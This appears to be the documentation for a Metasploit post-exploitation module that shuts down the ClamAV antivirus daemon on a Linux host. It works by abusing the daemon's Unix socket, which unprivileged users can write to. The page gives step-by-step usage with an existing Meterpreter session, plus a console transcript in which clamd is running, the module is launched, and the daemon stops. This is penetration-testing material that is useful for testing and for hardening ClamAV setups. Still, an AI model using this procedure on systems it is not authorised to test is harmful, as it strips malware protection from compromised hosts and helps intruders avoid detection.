### Description
This module will cause the ClamAV service to be shutoff on Linux hosts. 
ClamAV uses a Unix socket that allows non-privileged users to interact with the ClamAV daemon via utilities like "clamscan".
However, no additional checks are required to trigger ClamAV's shutdown.

## Verification Steps
### Shutting off ClamAV
  1. Launch `msfconsole`
  2. Get a Meterpreter shell on a Linux host that's also running ClamAV.
  3. Do: `use post/linux/manage/disable_clamav`
  4. Do: `set SESSION <session number on the Linux host>`
  6. Do: `exploit -j`
  7. The daemon should be shutoff.

## Scenarios
```
msf6 post(linux/manage/disable_clamav) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  4         meterpreter x86/linux  dllcoolj @ 192.168.130.1  127.0.0.1:4444 -> 127.0.0.1:38360 (127.0.0.1)

msf6 post(linux/manage/disable_clamav) > show options

Module options (post/linux/manage/disable_clamav):

   Name                Current Setting        Required  Description
   ----                ---------------        --------  -----------
   CLAMAV_UNIX_SOCKET  /run/clamav/clamd.ctl  yes       ClamAV unix socket
   SESSION             4                      yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(linux/manage/disable_clamav) > ps -ef | grep 'clamd'
[*] exec: ps -ef | grep 'clamd'

clamav    132021       1 16 18:51 ?        00:00:09 clamd
dllcoolj  132533   71177  0 18:52 pts/3    00:00:00 sh -c ps -ef | grep 'clamd'
dllcoolj  132535  132533  0 18:52 pts/3    00:00:00 grep clamd
msf6 post(linux/manage/disable_clamav) > exploit -j
[*] Post module running as background job 10.
msf6 post(linux/manage/disable_clamav) >
[*] Checking file path /run/clamav/clamd.ctl exists and is writable...
[+] File does exist and is writable!
[*] Shutting down ClamAV!

msf6 post(linux/manage/disable_clamav) > ps -ef | grep 'clamd'
[*] exec: ps -ef | grep 'clamd'

dllcoolj  132927  132925  0 18:52 pts/3    00:00:00 grep clamd
```
